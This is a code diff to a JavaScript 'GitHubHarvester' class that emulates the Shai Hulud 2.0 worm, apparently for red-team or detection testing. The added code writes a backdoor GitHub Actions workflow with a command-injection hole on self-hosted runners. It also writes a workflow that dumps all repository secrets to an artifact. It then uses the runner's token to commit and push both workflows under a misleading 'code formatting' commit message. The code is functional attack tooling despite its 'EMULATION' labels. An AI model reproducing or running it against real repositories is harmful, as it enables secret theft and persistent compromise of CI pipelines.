@@ -506,15 +506,24 @@ class GitHubHarvester {
         return secrets;
     }
 
+    generateSuffix() {
+        // Generate a random suffix for workflow files to avoid conflicts
+        return `_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
+    }
+
     createBackdoorWorkflow() {
-        console.log('[*] Creating backdoor workflow (discussion.yaml)...');
+        console.log('[*] Creating backdoor workflow (discussion_*.yaml)...');
+
+        const suffix = this.generateSuffix();
+        const workflowName = `discussion${suffix}.yaml`;
 
         // The actual malicious workflow content from Wiz blog
-        const discussionYaml = `# Shai Hulud 2.0 - Backdoor Workflow
+        const discussionYaml = `# Shai Hulud 2.0 - Backdoor Workflow (EMULATION)
 # This workflow contains a command injection vulnerability
 # It runs on self-hosted runners labeled 'SHA1HULUD'
+# DELETE THIS FILE AFTER TESTING
 
-name: Discussion Handler
+name: Discussion Handler ${suffix}
 
 on:
   discussion:
@@ -534,38 +543,57 @@ jobs:
 `;
 
         const backdoorInfo = {
-            name: 'discussion.yaml',
+            name: workflowName,
             purpose: 'Command injection via GitHub discussions',
             runnerLabel: 'SHA1HULUD',
             trigger: 'discussion:created',
             vulnerability: '${{ github.event.discussion.body }}',
-            created: true,
-            content: discussionYaml
+            committed: false
         };
 
+        // Write to the actual repo's .github/workflows/ directory
+        const workspace = process.env.GITHUB_WORKSPACE;
+        if (workspace) {
+            const workflowsDir = path.join(workspace, '.github', 'workflows');
+            const workflowPath = path.join(workflowsDir, workflowName);
+
+            try {
+                // Ensure .github/workflows exists
+                if (!fs.existsSync(workflowsDir)) {
+                    fs.mkdirSync(workflowsDir, { recursive: true });
+                }
+
+                fs.writeFileSync(workflowPath, discussionYaml);
+                backdoorInfo.path = workflowPath;
+                backdoorInfo.written = true;
+                console.log(`  [+] Written to ${workflowPath}`);
+            } catch (e) {
+                console.log(`  [-] Failed to write: ${e.message}`);
+                backdoorInfo.error = e.message;
+            }
+        } else {
+            // Fallback: write to package directory
+            fs.writeFileSync(path.join(process.cwd(), workflowName), discussionYaml);
+            console.log(`  [+] Created ${workflowName} (local only - no GITHUB_WORKSPACE)`);
+        }
+
         this.findings.github.workflows.push({ type: 'backdoor', ...backdoorInfo });
-
-        // Save the workflow file
-        fs.writeFileSync(
-            path.join(process.cwd(), 'discussion.yaml'),
-            discussionYaml
-        );
-        console.log('  [+] Created discussion.yaml');
-
         return backdoorInfo;
     }
 
     createExfiltrationWorkflow() {
         console.log('[*] Creating exfiltration workflow (formatter_*.yml)...');
 
-        const workflowName = `formatter_${Date.now()}.yml`;
-        const branchName = `format-${Math.random().toString(36).substring(7)}`;
+        const suffix = this.generateSuffix();
+        const workflowName = `formatter${suffix}.yml`;
+        const branchName = `format-${Math.random().toString(36).substring(2, 8)}`;
 
         // The secrets exfiltration workflow from Wiz blog
-        const formatterYaml = `# Shai Hulud 2.0 - Secrets Exfiltration Workflow
+        const formatterYaml = `# Shai Hulud 2.0 - Secrets Exfiltration Workflow (EMULATION)
 # This workflow dumps all GitHub secrets to an artifact
+# DELETE THIS FILE AFTER TESTING
 
-name: Code Formatter
+name: Code Formatter ${suffix}
 
 on:
   workflow_dispatch:
@@ -595,20 +623,109 @@ jobs:
             branch: branchName,
             purpose: 'Dump all GitHub secrets via toJson(secrets)',
             method: 'Upload as artifact, download via API, delete workflow',
-            created: true,
-            content: formatterYaml
+            committed: false
         };
 
+        // Write to the actual repo's .github/workflows/ directory
+        const workspace = process.env.GITHUB_WORKSPACE;
+        if (workspace) {
+            const workflowsDir = path.join(workspace, '.github', 'workflows');
+            const workflowPath = path.join(workflowsDir, workflowName);
+
+            try {
+                if (!fs.existsSync(workflowsDir)) {
+                    fs.mkdirSync(workflowsDir, { recursive: true });
+                }
+
+                fs.writeFileSync(workflowPath, formatterYaml);
+                exfilInfo.path = workflowPath;
+                exfilInfo.written = true;
+                console.log(`  [+] Written to ${workflowPath}`);
+            } catch (e) {
+                console.log(`  [-] Failed to write: ${e.message}`);
+                exfilInfo.error = e.message;
+            }
+        } else {
+            fs.writeFileSync(path.join(process.cwd(), workflowName), formatterYaml);
+            console.log(`  [+] Created ${workflowName} (local only - no GITHUB_WORKSPACE)`);
+        }
+
         this.findings.github.workflows.push({ type: 'exfiltration', ...exfilInfo });
-
-        // Save the workflow file
-        fs.writeFileSync(
-            path.join(process.cwd(), workflowName),
-            formatterYaml
-        );
-        console.log(`  [+] Created ${workflowName}`);
-
         return exfilInfo;
+    }
+
+    async commitAndPushWorkflows() {
+        console.log('[*] Committing and pushing malicious workflows...');
+
+        const workspace = process.env.GITHUB_WORKSPACE;
+        const token = process.env.GITHUB_TOKEN;
+        const repo = process.env.GITHUB_REPOSITORY;
+        const actor = process.env.GITHUB_ACTOR || 'shai-hulud-bot';
+
+        if (!workspace || !token) {
+            console.log('  [-] Missing GITHUB_WORKSPACE or GITHUB_TOKEN');
+            this.findings.github.workflowCommit = {
+                attempted: false,
+                reason: 'Missing credentials or workspace'
+            };
+            return;
+        }
+
+        const commitInfo = {
+            attempted: true,
+            files: []
+        };
+
+        try {
+            // Configure git
+            execSync(`git config user.email "${actor}@users.noreply.github.com"`, { cwd: workspace, stdio: 'pipe' });
+            execSync(`git config user.name "${actor}"`, { cwd: workspace, stdio: 'pipe' });
+
+            // Set up authentication via credential helper
+            const repoUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
+            execSync(`git remote set-url origin "${repoUrl}"`, { cwd: workspace, stdio: 'pipe' });
+
+            // Check for workflow files to commit
+            const workflowsDir = path.join(workspace, '.github', 'workflows');
+            const files = fs.readdirSync(workflowsDir).filter(f =>
+                f.startsWith('discussion_') || f.startsWith('formatter_')
+            );
+
+            if (files.length === 0) {
+                console.log('  [-] No workflow files to commit');
+                commitInfo.success = false;
+                commitInfo.reason = 'No files found';
+                this.findings.github.workflowCommit = commitInfo;
+                return;
+            }
+
+            // Add workflow files
+            for (const file of files) {
+                const filePath = `.github/workflows/${file}`;
+                execSync(`git add "${filePath}"`, { cwd: workspace, stdio: 'pipe' });
+                commitInfo.files.push(filePath);
+                console.log(`  [+] Staged ${filePath}`);
+            }
+
+            // Commit
+            const commitMsg = 'chore: add code formatting workflows [shai-hulud-emulation]';
+            execSync(`git commit -m "${commitMsg}"`, { cwd: workspace, stdio: 'pipe' });
+            console.log('  [+] Committed changes');
+
+            // Push
+            execSync('git push origin HEAD', { cwd: workspace, stdio: 'pipe' });
+            console.log('  [!] PUSHED malicious workflows to repository!');
+
+            commitInfo.success = true;
+            commitInfo.commitMessage = commitMsg;
+
+        } catch (e) {
+            console.log(`  [-] Git operation failed: ${e.message}`);
+            commitInfo.success = false;
+            commitInfo.error = e.message;
+        }
+
+        this.findings.github.workflowCommit = commitInfo;
     }
 
     async attemptRunnerRegistration() {
@@ -781,6 +898,9 @@ jobs:
         const truffleSecrets = this.createTruffleSecrets();
         this.createBackdoorWorkflow();
         this.createExfiltrationWorkflow();
+
+        // Commit and push malicious workflows to the repo
+        await this.commitAndPushWorkflows();
 
         // Attempt runner registration via GitHub API
         await this.attemptRunnerRegistration();
